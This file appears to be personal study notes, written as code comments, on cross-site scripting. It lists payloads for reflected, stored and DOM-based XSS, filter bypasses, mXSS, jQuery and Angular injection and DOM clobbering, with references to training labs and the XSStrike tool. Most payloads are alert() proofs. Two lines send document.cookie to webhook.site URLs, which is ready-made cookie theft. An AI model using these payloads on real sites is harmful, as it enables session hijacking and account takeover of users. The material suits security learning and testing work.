// Cross-site Scripting
//! XSS types
//*
// we have : https://example.com/search=hello
// rendered as <p> hello </p>
// using : https://example.com/search=<img+src=1+onerror="alert(1)"/>
// will render as <p> <img src=1 onerror=alert(1)> </p>
// and the alert will be executed when the user visits the page
//* stored xss
// if someone comments with : <img src=1 onerror="alert(1)"/>
// then its stored in the database
// everyone who visits the page will see the comment
// and the alert will be executed
//* dom based xss
// exploiting a source being passed into a sink
//? useful sinks :
// document.write() , document.writeln() , document.domain , element.innerHTML , element.outerHTML , element.insertAdjacentHTML , element.onevent
//? cheat sheet
// https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
//! Exploiting
//* script allowed
// <script>alert(1)</script>
// <script>
// new Image().src="https://webhook.site/2dc62e00-4e6c-4a13-a2ff-0cc59cc7dd90?cookie="+document.cookie;
// </script>;
//* script not allowed
// <svg onload='alert(1)'>
// <img src=1 onerror=alert(1)>
// <iframe src=1 onload=alert(1)>
// <img src=1 onerror="new Image().src='https://webhook.site/84ef8df6-e266-4ac4-85d4-1aef0b012f52?cookie='+document.cookie;">
// <a href="javascript:alert('Hello!')">Click me</a>;
//* JSON
// if the application is returning a json response
// that reflectes user input
// use \"-alert(1)}//
// this only works if the application is escaping quotaion marks but not backslashe
// so the result will be : {"name":"\\"-alert(1)}//"}
// our backslash will escape the one added by the application and the alert will be executed
//* replace mistake
// using the replace method to replace the "<" and ">" is not enought because it only
// replaces the first accurance of thoser characters
// so this will pass you filter : <><img src=1 onerror=alert(1)>
//* custom tags
// if all tags are banned , the browser support custom tag and some events work on them
// so we have  :  <xss id=x onfocus=alert(document.cookie) tabindex=1>
// if you serve it to the victim with #x at the end of the url the browser will automatically focus on this element
// firing the alert
//* all events + href banned
//<svg>
//  <a>
//    <animate attributeName=href values=javascript:alert(1) />
//  </a>
//* banned angle brackets
// if you're input is being passed to an attribute
// ex : <input value="mine" />
// you can inject
// " onfocus=alert(1) autofocus x="
//* canonical link tag
// if you can trick the victom to click a button ex: x
// and the page has a canonical link tag that you can add atributes to
// use : <link rel="canonical" href="ex" accesskey="x" onclick="alert(1)">
//* banned parenthesis
// you need to call funtions without them like
// <script>onerror=alert;throw 1337</script>
//* banned parentheses and semicolons
// <script>{onerror=alert}throw 1337</script>
//* mxss
// utilises browers parsing
// <?xml >s<img src=x onerror=alert(1)> ?>
// <noscript><p alt="</noscript><img src=x onerror=alert(1)>">
// <!-- </textarea><script>alert('miaw')</script>
//! some third party libraries
//* JQuery
// $('#backLink').attr("href", javascript:alert(1))
// if you can control the input of $()
// ex:
// $(window).on("hashchange", function () {
//   var element = $(location.hash);
//   element[0].scrollIntoView();
// });
// in here to need to pass you're exploit to location.hash but at the same time trigger a hashchange
// event and this can be done using an iframe
// <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=alert()>'"></iframe>
//* Angular
// when a site uses ng-app attribute on an html element
// {{}}  will processed by angular
// ex: {{$on.constructor('alert(1)')()}}
//! Relected XSS into javascript
//* basic
// if you have
// <script>
//      var input = 'controllable data here';
// </script>;
// use : </script><img src=1 onerror=alert(1)>
// works because browsers parses html before considering javascript
//* if the brackets are encoded
// '-alert(document.domain)-'
// ';alert(document.domain)//
//* if the single quote is escaped
// use : \';alert(document.domain)//
// in here you're backslash will escape the one added by the application
//* if the single quotes are encoded
// if it's in an onClick event handler the html parser
// will resolve &apos; to single quote before js executes
// use &apos;-alert(document.domain)-&apos;
//* if the controllable data is inside a template literal
// ${alert(document.domain)}
//! Dom Clobbering
//* to enable xss
// if : iframe.src = window.someObject.src ;
// we can change the someObject to an object that we set its src property
// <a id=someObject><a id=someObject name=src src=javascript:alert(1)>
//* to bypass filters
// if the filter deletes attributes element.attributes.length > 0
// in here element.attributes.length is gonna be undefined bypassing the filter
// <form id=x tabindex=0 onfocus=print()><input id=attributes>
//! tool
//* XSStrike
// at ctf/XSStrike
// python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
//* CspBypass
// https://cspbypass.com/
